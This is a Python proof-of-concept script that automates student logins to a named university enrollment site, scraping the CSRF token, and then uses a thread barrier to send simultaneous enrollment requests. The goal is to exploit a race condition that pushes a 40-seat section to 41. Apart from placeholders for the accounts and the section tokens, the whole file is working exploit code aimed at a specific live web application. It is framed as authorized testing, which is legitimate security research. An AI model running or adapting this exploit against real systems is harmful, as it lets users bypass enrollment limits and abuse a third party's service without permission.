#!/usr/bin/env python3
"""Proof-of-concept: demonstrate the seat-limit race condition.

FOR AUTHORIZED USE ON YOUR OWN SYSTEM ONLY, on a THROWAWAY TEST SECTION.
It logs in as two (or more) test students and fires their enrollment requests
into the SAME section at the same instant, to show that a 40-seat section can be
pushed past its limit (40 -> 41).

HOW IT WORKS
------------
1. Each account logs in (GET login page -> read CSRF _token -> POST credentials).
2. All accounts wait on a barrier, then hit the enroll endpoint simultaneously.
3. You then refresh the section list and observe 41/41.

BEFORE RUNNING
--------------
Fill in `enroll(...)` with the REAL enrollment request. Capture it once from your
browser: F12 -> Network -> click enroll -> Copy as cURL, and translate it here
(method, URL, and any form fields / token). Everything else is ready.

    python poc_race.py
"""

from __future__ import annotations

import re
import threading
from dataclasses import dataclass

import httpx

BASE = "https://iubatapp.net/Final-Enrollment"
LOGIN_URL = f"{BASE}/login"

# ------------------------------------------------------------------------
# Test accounts. Use throwaway accounts you created for testing.
# Add as many as you like; 2 is enough to show 40 -> 41.
# ------------------------------------------------------------------------
ACCOUNTS = [
    {"student_id": "TEST_STUDENT_ID_1", "password": "REPLACE_ME", "program": "BCSE"},
    {"student_id": "TEST_STUDENT_ID_2", "password": "REPLACE_ME", "program": "BCSE"},
]

# The section every account will try to enroll into AT THE SAME TIME.
# Use the course id + tokens from the enrollment URL of your TEST section
# that is currently at 39/40.
TARGET = {
    "course_id": "REPLACE_WITH_TEST_SECTION_COURSE_ID",
    "token_a": "REPLACE_WITH_TOKEN_A",
    "token_b": "REPLACE_WITH_TOKEN_B",
}


def login(account: dict) -> httpx.Client:
    """Log a student in and return an authenticated client (session cookies)."""
    client = httpx.Client(base_url=BASE, timeout=30, follow_redirects=True,
                          headers={"User-Agent": "poc-race-demo/1.0"})
    page = client.get("/login").text
    m = re.search(r'name="_token"\s+value="([^"]+)"', page)
    token = m.group(1) if m else ""
    client.post("/login", data={
        "_token": token,
        "student_id": account["student_id"],
        "password": account["password"],
        "program": account["program"],
    })
    return client


def enroll(client: httpx.Client, account: dict) -> str:
    """Send ONE enrollment request for `account` into TARGET.

    TODO: replace the body of this function with your real enroll request,
    captured from the browser (F12 -> Network -> Copy as cURL). It is likely one
    of these shapes:

      # If enrolling is a GET to the course URL:
      r = client.get(f"/courseinformation/{TARGET['course_id']}/"
                     f"{TARGET['token_a']}/{TARGET['token_b']}")

      # If it is a POST with a CSRF token + section id:
      # first GET the page to grab a fresh _token, then:
      # r = client.post("/enroll", data={"_token": token, "section": ...})

    Return something short describing the outcome (status code / message).
    """
    r = client.get(
        f"/courseinformation/{TARGET['course_id']}/"
        f"{TARGET['token_a']}/{TARGET['token_b']}"
    )
    return f"{account['student_id']}: HTTP {r.status_code}"


def main() -> None:
    if any(a["password"] == "REPLACE_ME" for a in ACCOUNTS):
        raise SystemExit("Fill in ACCOUNTS passwords and TARGET first.")

    print("[*] Logging in all accounts...")
    clients = [(a, login(a)) for a in ACCOUNTS]

    # Barrier makes every thread fire the enroll at the same instant — this is
    # what creates the race window that a sequential bot would only hit by luck.
    barrier = threading.Barrier(len(clients))
    results: list[str] = []
    lock = threading.Lock()

    def worker(account, client):
        barrier.wait()               # all threads line up here...
        out = enroll(client, account)  # ...then fire simultaneously
        with lock:
            results.append(out)

    threads = [threading.Thread(target=worker, args=(a, c)) for a, c in clients]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print("[*] Concurrent enroll results:")
    for r in results:
        print("   ", r)
    print("\n[*] Now refresh the section list. If it shows 41/41, the race "
          "condition is demonstrated.")


if __name__ == "__main__":
    main()
